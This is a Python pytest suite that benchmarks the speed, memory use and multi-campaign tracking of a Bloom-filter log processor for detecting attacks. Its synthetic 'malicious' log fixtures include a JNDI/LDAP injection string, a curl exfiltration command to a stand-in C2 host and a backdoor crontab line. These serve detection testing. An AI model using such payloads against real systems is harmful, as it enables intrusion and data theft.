"""
Performance Benchmarking Tests

Tests throughput, latency, and memory usage against targets:
- Throughput: >200K logs/sec
- Latency: <5 μs per log
- Memory: <720 MB constant
"""

import pytest
import sys
import time
import random
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from src.bloom.bloom_config import BloomConfig
from src.signatures.cve_loader import CVELoader
from src.processors.log_processor import LogProcessor


class TestPerformance:
    """Performance benchmarking tests"""

    @pytest.fixture
    def setup_system(self):
        """Setup APT detection system"""
        base_path = Path(__file__).parent.parent
        signatures_path = base_path / "data/signatures/cve_signatures.json"

        config = BloomConfig()
        cve_loader = CVELoader(str(signatures_path))
        processor = LogProcessor(cve_loader, config)

        return processor

    def generate_benign_logs(self, count: int) -> list:
        """Generate benign test logs"""
        benign_patterns = [
            "GET /index.html HTTP/1.1 200 OK",
            "POST /api/login username=user password=pass",
            "SELECT * FROM users WHERE id=1",
            "INFO Application started successfully",
            "Database backup completed successfully",
            "User john.doe logged in from 192.168.1.100",
            "File uploaded: document.pdf size=1024KB",
            "Email sent to user@example.com"
        ]

        logs = []
        for i in range(count):
            logs.append({
                'timestamp': f'2024-10-01T{i%24:02d}:{i%60:02d}:00Z',
                'source_ip': f'192.168.{random.randint(1,255)}.{random.randint(1,255)}',
                'target': f'server-{random.randint(1,10)}',
                'log': random.choice(benign_patterns)
            })

        return logs

    def generate_mixed_logs(self, count: int, malicious_ratio: float = 0.01) -> list:
        """Generate mixed benign and malicious logs"""
        logs = self.generate_benign_logs(count)

        malicious_patterns = [
            "${jndi:ldap://evil.com}",
            "Runtime.exec detected",
            "crontab @reboot /tmp/backdoor.sh",
            "SMB1 \\\\PIPE\\\\ exploit",
            "lsass.exe dumped",
            "curl -X POST http://c2.com/exfil"
        ]

        # Replace some logs with malicious ones
        num_malicious = int(count * malicious_ratio)
        for i in range(num_malicious):
            idx = random.randint(0, count - 1)
            logs[idx]['log'] = random.choice(malicious_patterns)

        return logs

    def test_throughput_10k_logs(self, setup_system):
        """Test throughput with 10K logs"""
        processor = setup_system
        logs = self.generate_benign_logs(10000)

        start_time = time.time()

        for log in logs:
            processor.process_log(log)

        elapsed = time.time() - start_time
        throughput = len(logs) / elapsed

        print(f"\n10K logs throughput: {throughput:.2f} logs/sec")
        print(f"Average time per log: {processor.metrics.get_avg_processing_time_us():.2f} μs")

        # Should process reasonably fast
        assert throughput > 1000  # At least 1K logs/sec

    def test_throughput_100k_logs(self, setup_system):
        """Test throughput with 100K logs"""
        processor = setup_system
        logs = self.generate_benign_logs(100000)

        start_time = time.time()

        for log in logs:
            processor.process_log(log)

        elapsed = time.time() - start_time
        throughput = len(logs) / elapsed

        print(f"\n100K logs throughput: {throughput:.2f} logs/sec")
        print(f"Average time per log: {processor.metrics.get_avg_processing_time_us():.2f} μs")
        print(f"Memory usage: {processor.metrics.get_current_memory_mb():.2f} MB")

        # Log performance
        avg_time = processor.metrics.get_avg_processing_time_us()
        print(f"\nPerformance vs Target:")
        print(f"  Throughput: {throughput:.0f} logs/sec (target: >200K)")
        print(f"  Latency: {avg_time:.2f} μs (target: <5 μs)")

    @pytest.mark.slow
    def test_throughput_1m_logs(self, setup_system):
        """Test throughput with 1M logs (marked as slow)"""
        processor = setup_system
        logs = self.generate_benign_logs(1000000)

        start_time = time.time()

        for i, log in enumerate(logs):
            processor.process_log(log)

            if (i + 1) % 100000 == 0:
                print(f"Processed {i + 1:,} logs...")

        elapsed = time.time() - start_time
        throughput = len(logs) / elapsed

        print(f"\n1M logs throughput: {throughput:.2f} logs/sec")
        print(f"Average time per log: {processor.metrics.get_avg_processing_time_us():.2f} μs")
        print(f"Memory usage: {processor.metrics.get_current_memory_mb():.2f} MB")

    def test_memory_constant(self, setup_system):
        """Test that memory usage remains constant"""
        processor = setup_system

        memory_samples = []

        # Process logs in batches and check memory
        for batch in range(10):
            logs = self.generate_benign_logs(10000)

            for log in logs:
                processor.process_log(log)

            memory = processor.metrics.sample_memory()
            memory_samples.append(memory)
            print(f"Batch {batch + 1}: {memory:.2f} MB")

        # Memory should not grow significantly
        max_memory = max(memory_samples)
        min_memory = min(memory_samples)
        growth = max_memory - min_memory

        print(f"\nMemory growth: {growth:.2f} MB")
        print(f"Max memory: {max_memory:.2f} MB (budget: 720 MB)")

        # Memory growth should be minimal (allow 50 MB variance)
        assert growth < 50

    def test_latency_consistency(self, setup_system):
        """Test that latency remains consistent"""
        processor = setup_system

        latencies = []

        logs = self.generate_benign_logs(1000)

        for log in logs:
            start = time.perf_counter()
            processor.process_log(log)
            elapsed_us = (time.perf_counter() - start) * 1_000_000
            latencies.append(elapsed_us)

        avg_latency = sum(latencies) / len(latencies)
        max_latency = max(latencies)
        min_latency = min(latencies)

        print(f"\nLatency statistics:")
        print(f"  Average: {avg_latency:.2f} μs")
        print(f"  Min: {min_latency:.2f} μs")
        print(f"  Max: {max_latency:.2f} μs")
        print(f"  Std dev: {(sum((l - avg_latency) ** 2 for l in latencies) / len(latencies)) ** 0.5:.2f} μs")

        # Latency should be reasonably consistent
        assert max_latency < avg_latency * 10  # Max should be < 10x average

    def test_mixed_workload_performance(self, setup_system):
        """Test performance with mixed benign/malicious logs"""
        processor = setup_system

        # 1% malicious logs (realistic scenario)
        logs = self.generate_mixed_logs(10000, malicious_ratio=0.01)

        start_time = time.time()

        alerts = []
        for log in logs:
            alert = processor.process_log(log)
            if alert:
                alerts.append(alert)

        elapsed = time.time() - start_time
        throughput = len(logs) / elapsed

        print(f"\nMixed workload (1% malicious):")
        print(f"  Throughput: {throughput:.2f} logs/sec")
        print(f"  Alerts generated: {len(alerts)}")
        print(f"  Average time: {processor.metrics.get_avg_processing_time_us():.2f} μs")
        print(f"  Memory: {processor.metrics.get_current_memory_mb():.2f} MB")

    def test_bloom_filter_performance(self, setup_system):
        """Test individual Bloom filter performance"""
        processor = setup_system

        # Test pattern bloom
        test_log = "${jndi:ldap://evil.com} Runtime.exec crontab @reboot"

        times = []
        for _ in range(1000):
            start = time.perf_counter()
            processor.pattern_bloom.check_log(test_log)
            elapsed = (time.perf_counter() - start) * 1_000_000
            times.append(elapsed)

        avg_time = sum(times) / len(times)
        print(f"\nPattern Bloom average time: {avg_time:.2f} μs")
        print(f"Target: 2.5 μs (18-48x faster than regex)")

        # Should be very fast
        assert avg_time < 10  # Allow some overhead, still fast


class TestScalability:
    """Test system scalability"""

    @pytest.fixture
    def setup_system(self):
        """Setup APT detection system"""
        base_path = Path(__file__).parent.parent
        signatures_path = base_path / "data/signatures/cve_signatures.json"

        config = BloomConfig()
        cve_loader = CVELoader(str(signatures_path))
        processor = LogProcessor(cve_loader, config)

        return processor

    def test_multiple_concurrent_campaigns(self, setup_system):
        """Test handling multiple concurrent APT campaigns"""
        processor = setup_system

        # Simulate 10 different attackers targeting different systems
        for attacker_id in range(10):
            for stage in range(1, 4):
                log = {
                    'timestamp': f'2024-10-{stage:02d}T10:00:00Z',
                    'source_ip': f'10.0.{attacker_id}.5',
                    'target': f'server-{attacker_id}',
                    'log': '${jndi:ldap://evil.com}' if stage == 1 else
                           'Runtime.exec' if stage == 2 else
                           'crontab @reboot'
                }
                processor.process_log(log)

        # Should track all 10 campaigns
        campaigns = processor.event_bloom.get_all_campaigns()
        print(f"\nConcurrent campaigns tracked: {len(campaigns)}")

        assert len(campaigns) >= 10


if __name__ == "__main__":
    # Run tests with verbose output
    pytest.main([__file__, '-v', '-s'])
